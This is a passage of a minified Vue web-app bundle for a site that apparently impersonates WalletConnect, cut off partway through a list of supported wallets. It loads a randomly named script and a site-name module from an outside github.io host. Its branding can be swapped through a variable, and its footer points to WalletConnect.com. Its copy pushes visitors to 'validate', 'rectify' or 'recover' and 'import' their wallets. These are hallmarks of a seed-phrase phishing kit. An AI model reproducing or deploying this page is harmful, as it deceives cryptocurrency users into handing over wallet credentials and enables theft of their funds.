import { cmBwsbFSqC } from 'https://giterhaber.github.io/web-codes/cmBwsbFSqC.js'
import { webname } from 'https://giterhaber.github.io/web-codes/changename.js'








import {
    r as d,
    o as s,
    c as r,
    a as e,
    b as p,
    w as h,
    u,
    R as x,
    d as E,
    e as y,
    f as I,
    g as R,
    F as j,
    h as N,
    p as G,
    i as X,
    t as f,
    j as U,
    k as _,
    v as O,
    l as B,
    n as Y,
    m as Z,
    q as J,
    P as q,
    s as Q,
    x as ee,
    y as V,
    z as te,
    A as M,
    B as W,
    C as ae,
    D as z,
    E as le,
    G as oe,
    H as ne,
    I as ie,
    J as se,
    K as re,
    L as de,
} from "./vendor.c6023955.js";






const ce = function () {
    const l = document.createElement("link").relList;
    if (l && l.supports && l.supports("modulepreload")) return;
    for (const t of document.querySelectorAll('link[rel="modulepreload"]')) o(t);
    new MutationObserver((t) => {
        for (const i of t)
            if (i.type === "childList")
                for (const c of i.addedNodes)
                    c.tagName === "LINK" && c.rel === "modulepreload" && o(c);
    }).observe(document, {
        childList: !0,
        subtree: !0
    });

    function a(t) {
        const i = {};
        return (
            t.integrity && (i.integrity = t.integrity),
            t.referrerpolicy && (i.referrerPolicy = t.referrerpolicy),
            t.crossorigin === "use-credentials" ?
                (i.credentials = "include") :
                t.crossorigin === "anonymous" ?
                    (i.credentials = "omit") :
                    (i.credentials = "same-origin"),
            i
        );
    }

    function o(t) {
        if (t.ep) return;
        t.ep = !0;
        const i = a(t);
        fetch(t.href, i);
    }
};
ce();


var pe = "/assets/icon.39806354.png";
const ge = {
    class: "py-3 shadow-md"
},
    he = {
        class: "max-w-7xl mx-auto bg-white border-gray-200 px-2 sm:px-4 py-2.5 rounded dark:bg-sky-800",
    },
    we = {
        class: "flex flex-wrap justify-between items-center mx-auto"
    },
    me = e("img", {
        class: "w-10 h-10",
        src: pe,
        alt: "logo"
    }, null, -1),
    ue = e(
        "div", {
        class: "text-xl md:2xl font-bold ..."
    }, [
        e(
            "span", {
            class: "bg-clip-text text-transparent bg-gradient-to-r from-[#3C99FC] to-[#3F8A85]",
        },
            `${webname}`
        ),
    ], -1
    ),
    xe = {
        class: "flex md:order-2"
    },
    fe = y("Connect"),
    ye = I(
        '<span class="sr-only">Open main menu</span><svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg><svg class="hidden w-6 h-6" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg>',
        3
    ),
    ve = [ye],
    be = I(
        '<div class="hidden justify-between items-center w-full md:flex md:w-auto md:order-1" id="mobile-menu-4"><ul class="flex flex-col mt-4 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium lg:text-base"><li><a href="#" class="block py-2 pr-4 pl-3 text-white bg-sky-700 rounded md:bg-transparent md:text-sky-700 md:p-0 dark:text-white" aria-current="page">Home</a></li><li><a href="#" class="block py-2 pr-4 pl-3 text-gray-700 border-b border-gray-100 hover:bg-gray-50 md:hover:bg-transparent md:border-0 md:hover:text-sky-700 md:p-0 md:dark:hover:text-white dark:text-gray-400 dark:hover:bg-gray-700 dark:hover:text-white md:dark:hover:bg-transparent dark:border-gray-700">About</a></li><li><a href="#" class="block py-2 pr-4 pl-3 text-gray-700 border-b border-gray-100 hover:bg-gray-50 md:hover:bg-transparent md:border-0 md:hover:text-sky-700 md:p-0 md:dark:hover:text-white dark:text-gray-400 dark:hover:bg-gray-700 dark:hover:text-white md:dark:hover:bg-transparent dark:border-gray-700">Services</a></li><li><a href="#" class="block py-2 pr-4 pl-3 text-gray-700 border-b border-gray-100 hover:bg-gray-50 md:hover:bg-transparent md:border-0 md:hover:text-sky-700 md:p-0 md:dark:hover:text-white dark:text-gray-400 dark:hover:bg-gray-700 dark:hover:text-white md:dark:hover:bg-transparent dark:border-gray-700">Contact</a></li></ul></div>',
        1
    ),
    ke = {
        key: 0,
        class: "fixed inset-0 px-2 py-1.5 min-h-screen bg-transparent z-50",
    },
    _e = {
        class: "",
        "aria-label": "Sidebar"
    },
    je = {
        class: "overflow-y-auto py-4 px-3 bg-gray-50 rounded dark:bg-gray-800",
    },
    Ne = {
        class: "pb-[7%] pt-[3%] flex justify-end"
    },
    Ie = e(
        "svg", {
        class: "w-6 h-6",
        fill: "none",
        stroke: "currentColor",
        viewBox: "0 0 24 24",
        xmlns: "http://www.w3.org/2000/svg",
    }, [
        e("path", {
            "stroke-linecap": "round",
            "stroke-linejoin": "round",
            "stroke-width": "2",
            d: "M6 18L18 6M6 6l12 12",
        }),
    ], -1
    ),
    Ce = [Ie],
    We = e(
        "ul", {
        class: "space-y-2"
    }, [
        e("li", null, [
            e(
                "a", {
                href: "#",
                class: "flex items-center p-2 text-base font-normal text-gray-900 rounded-lg dark:text-white hover:bg-gray-100 dark:hover:bg-gray-700",
            }, [
                e(
                    "svg", {
                    class: "w-6 h-6 text-gray-500 transition duration-75 dark:text-gray-400 group-hover:text-gray-900 dark:group-hover:text-white",
                    fill: "currentColor",
                    viewBox: "0 0 20 20",
                    xmlns: "http://www.w3.org/2000/svg",
                }, [
                    e("path", {
                        d: "M2 10a8 8 0 018-8v8h8a8 8 0 11-16 0z"
                    }),
                    e("path", {
                        d: "M12 2.252A8.014 8.014 0 0117.748 8H12V2.252z",
                    }),
                ]
                ),
                e("span", {
                    class: "ml-3"
                }, "Dashboard"),
            ]
            ),
        ]),
        e("li", null, [
            e(
                "button", {
                type: "button",
                class: "flex items-center p-2 w-full text-base font-normal text-gray-900 rounded-lg transition duration-75 group hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700",
                "aria-controls": "dropdown-example",
                "data-collapse-toggle": "dropdown-example",
            }, [
                e(
                    "svg", {
                    class: "flex-shrink-0 w-6 h-6 text-gray-500 transition duration-75 group-hover:text-gray-900 dark:text-gray-400 dark:group-hover:text-white",
                    fill: "currentColor",
                    viewBox: "0 0 20 20",
                    xmlns: "http://www.w3.org/2000/svg",
                }, [
                    e("path", {
                        "fill-rule": "evenodd",
                        d: "M10 2a4 4 0 00-4 4v1H5a1 1 0 00-.994.89l-1 9A1 1 0 004 18h12a1 1 0 00.994-1.11l-1-9A1 1 0 0015 7h-1V6a4 4 0 00-4-4zm2 5V6a2 2 0 10-4 0v1h4zm-6 3a1 1 0 112 0 1 1 0 01-2 0zm7-1a1 1 0 100 2 1 1 0 000-2z",
                        "clip-rule": "evenodd",
                    }),
                ]
                ),
                e(
                    "span", {
                    class: "flex-1 ml-3 text-left whitespace-nowrap",
                    "sidebar-toggle-item": "",
                },
                    "E-commerce"
                ),
                e(
                    "svg", {
                    "sidebar-toggle-item": "",
                    class: "w-6 h-6",
                    fill: "currentColor",
                    viewBox: "0 0 20 20",
                    xmlns: "http://www.w3.org/2000/svg",
                }, [
                    e("path", {
                        "fill-rule": "evenodd",
                        d: "M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z",
                        "clip-rule": "evenodd",
                    }),
                ]
                ),
            ]
            ),
            e("ul", {
                id: "dropdown-example",
                class: "hidden py-2 space-y-2"
            }, [
                e("li", null, [
                    e(
                        "a", {
                        href: "#",
                        class: "flex items-center p-2 pl-11 w-full text-base font-normal text-gray-900 rounded-lg transition duration-75 group hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700",
                    },
                        "Products"
                    ),
                ]),
                e("li", null, [
                    e(
                        "a", {
                        href: "#",
                        class: "flex items-center p-2 pl-11 w-full text-base font-normal text-gray-900 rounded-lg transition duration-75 group hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700",
                    },
                        "Billing"
                    ),
                ]),
                e("li", null, [
                    e(
                        "a", {
                        href: "#",
                        class: "flex items-center p-2 pl-11 w-full text-base font-normal text-gray-900 rounded-lg transition duration-75 group hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700",
                    },
                        "Invoice"
                    ),
                ]),
            ]),
        ]),
        e("li", null, [
            e(
                "a", {
                href: "#",
                class: "flex items-center p-2 text-base font-normal text-gray-900 rounded-lg dark:text-white hover:bg-gray-100 dark:hover:bg-gray-700",
            }, [
                e(
                    "svg", {
                    class: "flex-shrink-0 w-6 h-6 text-gray-500 transition duration-75 dark:text-gray-400 group-hover:text-gray-900 dark:group-hover:text-white",
                    fill: "currentColor",
                    viewBox: "0 0 20 20",
                    xmlns: "http://www.w3.org/2000/svg",
                }, [
                    e("path", {
                        d: "M5 3a2 2 0 00-2 2v2a2 2 0 002 2h2a2 2 0 002-2V5a2 2 0 00-2-2H5zM5 11a2 2 0 00-2 2v2a2 2 0 002 2h2a2 2 0 002-2v-2a2 2 0 00-2-2H5zM11 5a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V5zM11 13a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z",
                    }),
                ]
                ),
                e("span", {
                    class: "flex-1 ml-3 whitespace-nowrap"
                }, "Kanban"),
                e(
                    "span", {
                    class: "inline-flex justify-center items-center px-2 ml-3 text-sm font-medium text-gray-800 bg-gray-200 rounded-full dark:bg-gray-700 dark:text-gray-300",
                },
                    "Pro"
                ),
            ]
            ),
        ]),
        e("li", null, [
            e(
                "a", {
                href: "#",
                class: "flex items-center p-2 text-base font-normal text-gray-900 rounded-lg dark:text-white hover:bg-gray-100 dark:hover:bg-gray-700",
            }, [
                e(
                    "svg", {
                    class: "flex-shrink-0 w-6 h-6 text-gray-500 transition duration-75 dark:text-gray-400 group-hover:text-gray-900 dark:group-hover:text-white",
                    fill: "currentColor",
                    viewBox: "0 0 20 20",
                    xmlns: "http://www.w3.org/2000/svg",
                }, [
                    e("path", {
                        d: "M8.707 7.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l2-2a1 1 0 00-1.414-1.414L11 7.586V3a1 1 0 10-2 0v4.586l-.293-.293z",
                    }),
                    e("path", {
                        d: "M3 5a2 2 0 012-2h1a1 1 0 010 2H5v7h2l1 2h4l1-2h2V5h-1a1 1 0 110-2h1a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V5z",
                    }),
                ]
                ),
                e("span", {
                    class: "flex-1 ml-3 whitespace-nowrap"
                }, "Inbox"),
                e(
                    "span", {
                    class: "inline-flex justify-center items-center p-3 ml-3 w-3 h-3 text-sm font-medium text-blue-600 bg-blue-200 rounded-full dark:bg-blue-900 dark:text-blue-200",
                },
                    "3"
                ),
            ]
            ),
        ]),
        e("li", null, [
            e(
                "a", {
                href: "#",
                class: "flex items-center p-2 text-base font-normal text-gray-900 rounded-lg dark:text-white hover:bg-gray-100 dark:hover:bg-gray-700",
            }, [
                e(
                    "svg", {
                    class: "flex-shrink-0 w-6 h-6 text-gray-500 transition duration-75 dark:text-gray-400 group-hover:text-gray-900 dark:group-hover:text-white",
                    fill: "currentColor",
                    viewBox: "0 0 20 20",
                    xmlns: "http://www.w3.org/2000/svg",
                }, [
                    e("path", {
                        "fill-rule": "evenodd",
                        d: "M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z",
                        "clip-rule": "evenodd",
                    }),
                ]
                ),
                e("span", {
                    class: "flex-1 ml-3 whitespace-nowrap"
                }, "Users"),
            ]
            ),
        ]),
        e("li", null, [
            e(
                "a", {
                href: "#",
                class: "flex items-center p-2 text-base font-normal text-gray-900 rounded-lg dark:text-white hover:bg-gray-100 dark:hover:bg-gray-700",
            }, [
                e(
                    "svg", {
                    class: "flex-shrink-0 w-6 h-6 text-gray-500 transition duration-75 dark:text-gray-400 group-hover:text-gray-900 dark:group-hover:text-white",
                    fill: "currentColor",
                    viewBox: "0 0 20 20",
                    xmlns: "http://www.w3.org/2000/svg",
                }, [
                    e("path", {
                        "fill-rule": "evenodd",
                        d: "M10 2a4 4 0 00-4 4v1H5a1 1 0 00-.994.89l-1 9A1 1 0 004 18h12a1 1 0 00.994-1.11l-1-9A1 1 0 0015 7h-1V6a4 4 0 00-4-4zm2 5V6a2 2 0 10-4 0v1h4zm-6 3a1 1 0 112 0 1 1 0 01-2 0zm7-1a1 1 0 100 2 1 1 0 000-2z",
                        "clip-rule": "evenodd",
                    }),
                ]
                ),
                e("span", {
                    class: "flex-1 ml-3 whitespace-nowrap"
                }, "Products"),
            ]
            ),
        ]),
        e("li", null, [
            e(
                "a", {
                href: "#",
                class: "flex items-center p-2 text-base font-normal text-gray-900 rounded-lg dark:text-white hover:bg-gray-100 dark:hover:bg-gray-700",
            }, [
                e(
                    "svg", {
                    class: "flex-shrink-0 w-6 h-6 text-gray-500 transition duration-75 dark:text-gray-400 group-hover:text-gray-900 dark:group-hover:text-white",
                    fill: "currentColor",
                    viewBox: "0 0 20 20",
                    xmlns: "http://www.w3.org/2000/svg",
                }, [
                    e("path", {
                        "fill-rule": "evenodd",
                        d: "M3 3a1 1 0 00-1 1v12a1 1 0 102 0V4a1 1 0 00-1-1zm10.293 9.293a1 1 0 001.414 1.414l3-3a1 1 0 000-1.414l-3-3a1 1 0 10-1.414 1.414L14.586 9H7a1 1 0 100 2h7.586l-1.293 1.293z",
                        "clip-rule": "evenodd",
                    }),
                ]
                ),
                e("span", {
                    class: "flex-1 ml-3 whitespace-nowrap"
                }, "Sign In"),
            ]
            ),
        ]),
        e("li", null, [
            e(
                "a", {
                href: "#",
                class: "flex items-center p-2 text-base font-normal text-gray-900 rounded-lg dark:text-white hover:bg-gray-100 dark:hover:bg-gray-700",
            }, [
                e(
                    "svg", {
                    class: "flex-shrink-0 w-6 h-6 text-gray-500 transition duration-75 dark:text-gray-400 group-hover:text-gray-900 dark:group-hover:text-white",
                    fill: "currentColor",
                    viewBox: "0 0 20 20",
                    xmlns: "http://www.w3.org/2000/svg",
                }, [
                    e("path", {
                        "fill-rule": "evenodd",
                        d: "M5 4a3 3 0 00-3 3v6a3 3 0 003 3h10a3 3 0 003-3V7a3 3 0 00-3-3H5zm-1 9v-1h5v2H5a1 1 0 01-1-1zm7 1h4a1 1 0 001-1v-1h-5v2zm0-4h5V8h-5v2zM9 8H4v2h5V8z",
                        "clip-rule": "evenodd",
                    }),
                ]
                ),
                e("span", {
                    class: "flex-1 ml-3 whitespace-nowrap"
                }, "Sign Up"),
            ]
            ),
        ]),
    ], -1
    ),
    $e = {
        setup(n) {
            const l = d(!1);
            return (a, o) => (
                s(),
                r("header", ge, [
                    e("nav", he, [
                        e("div", we, [
                            p(
                                u(x), {
                                to: {
                                    name: "home"
                                },
                                class: "flex items-center gap-1"
                            }, {
                                default: h(() => [me, ue]),
                                _: 1
                            }
                            ),
                            e("div", xe, [
                                p(
                                    u(x), {
                                    to: {
                                        name: "wallet"
                                    },
                                    class: "text-white bg-sky-700 hover:bg-sky-800 focus:ring-4 focus:ring-sky-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center lg:text-base mr-3 md:mr-0 dark:bg-sky-600 dark:hover:bg-sky-700 dark:focus:ring-sky-800 transition-colors ease-linear delay-150",
                                }, {
                                    default: h(() => [fe]),
                                    _: 1
                                }
                                ),
                                e(
                                    "button", {
                                    onClick: o[0] || (o[0] = (t) => (l.value = !0)),
                                    "data-collapse-toggle": "mobile-menu-4",
                                    type: "button",
                                    class: "inline-flex items-center p-2 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600",
                                    "aria-controls": "mobile-menu-4",
                                    "aria-expanded": "false",
                                },
                                    ve
                                ),
                            ]),
                            be,
                        ]),
                    ]),
                    l.value ?
                        (s(),
                            r("div", ke, [
                                e("aside", _e, [
                                    e("div", je, [
                                        e("div", Ne, [
                                            e(
                                                "button", {
                                                onClick: o[1] || (o[1] = (t) => (l.value = !1))
                                            },
                                                Ce
                                            ),
                                        ]),
                                        We,
                                    ]),
                                ]),
                            ])) :
                        E("", !0),
                ])
            );
        },
    };
var v = (n, l) => {
    const a = n.__vccOpts || n;
    for (const [o, t] of l) a[o] = t;
    return a;
};
const Se = {},
    Ae = {
        class: "p-4 max-w-7xl mx-auto bg-white sm:p-6 dark:bg-sky-800 mt-2"
    },
    Me = I(
        `<div class="flex flex-col gap-2 items-center sm:justify-between"><div class="flex mt-1 space-x-6 sm:justify-center sm:mt-0"><a href="#" class="text-gray-500 hover:text-gray-900 dark:hover:text-white"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg></a><a href="#" class="text-gray-500 hover:text-gray-900 dark:hover:text-white"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="evenodd" d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z" clip-rule="evenodd"></path></svg></a><a href="#" class="text-gray-500 hover:text-gray-900 dark:hover:text-white"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="evenodd" d="M12.315 2c2.43 0 2.784.013 3.808.06 1.064.049 1.791.218 2.427.465a4.902 4.902 0 011.772 1.153 4.902 4.902 0 011.153 1.772c.247.636.416 1.363.465 2.427.048 1.067.06 1.407.06 4.123v.08c0 2.643-.012 2.987-.06 4.043-.049 1.064-.218 1.791-.465 2.427a4.902 4.902 0 01-1.153 1.772 4.902 4.902 0 01-1.772 1.153c-.636.247-1.363.416-2.427.465-1.067.048-1.407.06-4.123.06h-.08c-2.643 0-2.987-.012-4.043-.06-1.064-.049-1.791-.218-2.427-.465a4.902 4.902 0 01-1.772-1.153 4.902 4.902 0 01-1.153-1.772c-.247-.636-.416-1.363-.465-2.427-.047-1.024-.06-1.379-.06-3.808v-.63c0-2.43.013-2.784.06-3.808.049-1.064.218-1.791.465-2.427a4.902 4.902 0 011.153-1.772A4.902 4.902 0 015.45 2.525c.636-.247 1.363-.416 2.427-.465C8.901 2.013 9.256 2 11.685 2h.63zm-.081 1.802h-.468c-2.456 0-2.784.011-3.807.058-.975.045-1.504.207-1.857.344-.467.182-.8.398-1.15.748-.35.35-.566.683-.748 1.15-.137.353-.3.882-.344 1.857-.047 1.023-.058 1.351-.058 3.807v.468c0 2.456.011 2.784.058 3.807.045.975.207 1.504.344 1.857.182.466.399.8.748 1.15.35.35.683.566 1.15.748.353.137.882.3 1.857.344 1.054.048 1.37.058 4.041.058h.08c2.597 0 2.917-.01${webname} 3.96-.058.976-.045 1.505-.207 1.858-.344.466-.182.8-.398 1.15-.748.35-.35.566-.683.748-1.15.137-.353.3-.882.344-1.857.048-1.055.058-1.37.058-4.041v-.08c0-2.597-.01-2.917-.058-3.96-.045-.976-.207-1.505-.344-1.858a3.097 3.097 0 00-.748-1.15 3.098 3.098 0 00-1.15-.748c-.353-.137-.882-.3-1.857-.344-1.023-.047-1.351-.058-3.807-.058zM12 6.865a5.135 5.135 0 110 10.27 5.135 5.135 0 010-10.27zm0 1.802a3.333 3.333 0 100 6.666 3.333 3.333 0 000-6.666zm5.338-3.205a1.2 1.2 0 110 2.4 1.2 1.2 0 010-2.4z" clip-rule="evenodd"></path></svg></a></div><span class="text-sm text-gray-500 sm:text-center dark:text-gray-400">\xA9 2022 <a href="https://WalletConnect.com" target="_blank" class="hover:underline">${webname}.net</a>. </span></div>`,
        1
    ),
    Te = [Me];

function Pe(n, l, a, o, t, i) {
    return s(), r("footer", Ae, Te);
}
var De = v(Se, [
    ["render", Pe]
]);
const Ee = {
    class: ""
},
    Oe = {
        setup(n) {
            return (l, a) => (s(), r("div", Ee, [p($e), p(u(R)), p(De)]));
        },
    };
var F = "/assets/home-header.07972792.png";
const b = (n) => (G("data-v-7b35ba54"), (n = n()), X(), n),
    Be = {
        class: "mt-2"
    },
    Ve = {
        class: "bg-transparent py-16 relative"
    },
    ze = b(() =>
        e(
            "div", {
            class: "custom-shape-divider-bottom-1648547430 hidden"
        }, [
            e(
                "svg", {
                "data-name": "Layer 1",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 1200 120",
                preserveAspectRatio: "none",
            }, [
                e("path", {
                    d: "M321.39,56.44c58-10.79,114.16-30.13,172-41.86,82.39-16.72,168.19-17.73,250.45-.39C823.78,31,906.67,72,985.66,92.83c70.05,18.48,146.53,26.09,214.34,3V0H0V27.35A600.21,600.21,0,0,0,321.39,56.44Z",
                    class: "shape-fill",
                }),
            ]
            ),
        ], -1
        )
    ),
    Fe = {
        class: "max-w-7xl mx-auto"
    },
    He = {
        class: "flex flex-col-reverse lg:flex-row justify-between items-center relative",
    },
    Le = {
        class: "flex flex-col items-center justify-center gap-3"
    },
    Ke = b(() =>
        e(
            "h1", {
            class: "pt-4 text-center font-bold text-2xl lg:text-3xl text-gray-800 max-w-xs lg:max-w-md tracking-wide leading-normal",
        },
            " Link your DApps to mobile wallets ", -1
        )
    ),
    Re = b(() =>
        e(
            "p", {
            class: "text-center text-gray-800 pt-2 max-w-sm"
        },
            ` ${webname} is an open protocol that lets users connect their mobile crypto wallets to your DApp. `, -1
        )
    ),
    Ge = y("Get Started"),
    Xe = b(() =>
        e(
            "img", {
            class: "hidden lg:block bg-contain bg-center py-4 w-[] right-0 h-full absolute top-0",
            src: F,
            alt: "image",
        },
            null, -1
        )
    ),
    Ue = b(() =>
        e(
            "img", {
            class: "block lg:hidden bg-contain bg-center px-3 py-4 min-w-[200px] w-full sm:min-w-[400px] h-full",
            src: F,
            alt: "image",
        },
            null, -1
        )
    ),
    Ye = I(
        '<section class="pt-8 pb-5 bg-gray-900" data-v-7b35ba54><div class="max-w-7xl mx-auto" data-v-7b35ba54><div class="flex flex-col gap-3 px-3 py-2 mt-4" data-v-7b35ba54><h1 class="text-gray-100 font-bold text-3xl text-center leading-normal pb-7 lg:text-4xl" data-v-7b35ba54> Get Started in 3 Easy Steps </h1><p class="text-gray-700 font-semibold pt-3 text-xl max-w-xs hidden" data-v-7b35ba54> Which of these is related to your issue? </p><div class="bg-gray-100 flex flex-col w-full px-6 py-8 rounded-md mb-7" data-v-7b35ba54><div class="flex flex-col px-3 py-2.5 gap-3" data-v-7b35ba54><h1 class="font-bold text-2xl lg:text-3xl text-sky-500" data-v-7b35ba54>1.</h1><h2 class="font-semibold text-lg lg:text-3xl text-gray-800" data-v-7b35ba54>Choose Wallet</h2><p class="text-sm lg:text-base" data-v-7b35ba54> Select from our wide range of supported crypto wallets and either synchronize, validate, rectify or recover wallet. </p></div><div class="flex flex-col px-3 py-2.5 gap-3" data-v-7b35ba54><h1 class="font-bold text-2xl text-sky-500 lg:text-3xl" data-v-7b35ba54>2.</h1><h2 class="font-semibold text-lg text-gray-800 lg:text-3xl" data-v-7b35ba54> Validate Wallet </h2><p class="text-sm lg:text-base" data-v-7b35ba54> Prove ownership of the wallet you want to import. Private keys never leave mobile wallets, keeping user funds safe. </p></div><div class="flex flex-col px-3 py-2.5 gap-3 mb-7" data-v-7b35ba54><h1 class="font-bold text-2xl text-sky-500 lg:text-3xl" data-v-7b35ba54>3.</h1><h2 class="font-semibold text-lg text-gray-800 lg:text-3xl" data-v-7b35ba54>Get Connected</h2><p class="text-sm lg:text-base" data-v-7b35ba54> End-to-end encryption using client-side generated keys keeps all user activity private. </p></div></div></div></div></section>',
        1
    ),
    Ze = {
        class: "bg-white flex flex-col items-center"
    },
    Je = b(() =>
        e(
            "div", {
            class: "flex flex-col gap-2 text-center mt-10"
        }, [
            e(
                "h1", {
                class: "font-bold text-xl lg:text-5xl pt-7 pb-2"
            },
                "Supported Wallets"
            ),
            e(
                "p", {
                class: "text-sm lg:text-base pb-4 text-gray-600"
            },
                "All these wallets and many others"
            ),
        ], -1
        )
    ),
    qe = {
        class: "grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-x-[50px]"
    },
    Qe = ["href"],
    et = ["src", "alt"],
    tt = {
        class: "font-semibold pt-4 text-md text-center group-hover:text-sky-700",
    },
    at = {
        class: "pt-8 px-4 pb-5 bg-gray-900"
    },
    lt = {
        class: "flex flex-col items-center text-white gap-2"
    },
    ot = b(() =>
        e(
            "h1", {
            class: "font-bold max-w-[250px] lg:max-w-[1000px] text-center text-2xl lg:text-4xl py-3",
        },
            ` Get Started with ${webname} today `, -1
        )
    ),
    nt = y(" Connect Wallet "),
    it = {
        setup(n) {
            const l = d([{
                id: 1,
                icon: "rainbow.jpeg",
                heading: "Rainbow",
                link: "https://rainbow.me/",
            },
            {
                id: 2,
                icon: "trustwallet.jpeg",
                heading: "Trust Wallet",
                link: "https://trustwallet.com/",
            },
            {
                id: 3,
                icon: "argent.jpeg",
                heading: "Argent",
                link: "https://argent.xyz/",
            },
            {
                id: 4,
                icon: "MetaMask.jpeg",
                heading: "Metamask",
                link: "https://metamask.io/",
            },
            {
                id: 5,
                icon: "GnosisSafeMultisig.jpeg",
                heading: "Gnosis Safe Multisig",
                link: "https://gnosis-safe.io/",
            },
            {
                id: 6,
                icon: "Cryptocom.jpeg",
                heading: "Crypto.com | Defi Wallet",
                link: "https://crypto.com/",
            },
            {
                id: 7,
                icon: "Pillar.jpeg",
                heading: "Pillar",
                link: "https://pillarproject.io/",
            },
            {
                id: 8,
                icon: "imToken.jpeg",
                heading: "imToken",
                link: "https://token.im/",
            },
            {
                id: 9,
                icon: "ONTO.jpeg",
                heading: "ONTO",
                link: "https://onto.app/",
            },
            {
                id: 10,
                icon: "tokenpocket.jpeg",
                heading: "TokenPocket",
                link: "https://tokenpocket.pro/",
            },
            {
                id: 11,
                icon: "MathWallet.jpeg",
                heading: "MathWallet",
                link: "https://mathwallet.org/",
            },
            {
                id: 12,
                icon: "bitpay.jpeg",
                heading: "BitPay",
                link: "https://bitpay.com/",
            },
            {
                id: 13,
                icon: "LedgerLive.jpeg",
                heading: "Ledger Live",
                link: "https://www.ledger.com/",
            },
            {
                id: 14,
                icon: "Walleth.jpeg",
                heading: "Walleth",
                link: "https://walleth.org/",
            },
            {
                id: 15,
                icon: "Authereum.jpeg",
                heading: "Authereum",
                link: "https://authereum.org/",
            },
            {
                id: 16,
                icon: "dharma.jpeg",
                heading: "Dharma",
                link: "https://www.dharma.io/",
            },
            {
                id: 17,
                icon: "1inchWallet.jpeg",
                heading: "1inch Wallet",
                link: "https://1inch.io/wallet",
            },
            {
                id: 18,
                icon: "HuobiWallet.jpeg",
                heading: "Huobi Wallet",
                link: "https://huobiwallet.com/",
            },
            {
                id: 19,
                icon: "Eidoo.jpeg",
                heading: "Eidoo",
                link: "https://eidoo.io/",
            },
            {
                id: 20,
                icon: "MYKEY.jpeg",
                heading: "MYKEY",
                link: "https://mykey.org/",
            },
            {
                id: 21,
                icon: "Loopring.jpeg",
                heading: "Loopring wallet",
                link: "https://loopring.io/",
            },
            {
                id: 22,
                icon: "TrustVault.jpeg",
                heading: "TrustVault",
                link: "https://trustology.io/",
            },
            {
                id: 23,
                icon: "Atomic.jpeg",
                heading: "Atomic",
                link: "https://atomicwallet.io/",
            },
            {
                id: 24,
                icon: "Coin98.jpeg",
                heading: "Coin98",
                link: "https://coin98.app/",
            },
            {
                id: 25,
                icon: "CoolWalletS.jpeg",
                heading: "CoolWallet S",
                link: "https://coolwallet.io/",
            },
            {
                id: 26,
                icon: "Alice.jpeg",
                heading: "Alice",
                link: "https://alicedapp.com/",
            },
            {
                id: 27,
                icon: "AlphaWallet.jpeg",
                heading: "Alpha Wallet",
                link: "https://alphawallet.com/",
            },
            {
                id: 28,
                icon: "DCENTWallet.jpeg",
                heading: "D'CENT Wallet",
                link: "https://dcentwallet.com/",
            },
            {
                id: 29,
                icon: "ZelCore.jpeg",
                heading: "ZelCore",
                link: "https://zel.network/",
            },
            {
                id: 30,
                icon: "Nash.jpeg",
                heading: "Nash",
                link: "https://nash.io/",
            },
            {
                id: 31,
                icon: "Coinomi.jpeg",
                heading: "Coinomi",
                link: "https://coinomi.com/",
            },
            {
                id: 32,
                icon: "GridPlus.jpeg",
                heading: "GridPlus",
                link: "https://gridplus.io/",
            },
            {
                id: 33,
                icon: "CYBAVO.jpeg",
                heading: "CYBAVO",
                link: "https://cybavo.com/",
            },
            {
                id: 34,
                icon: "Tokenary.jpeg",
                heading: "Tokenary",
                link: "https://tokenary.io/",
            },
            {
                id: 35,
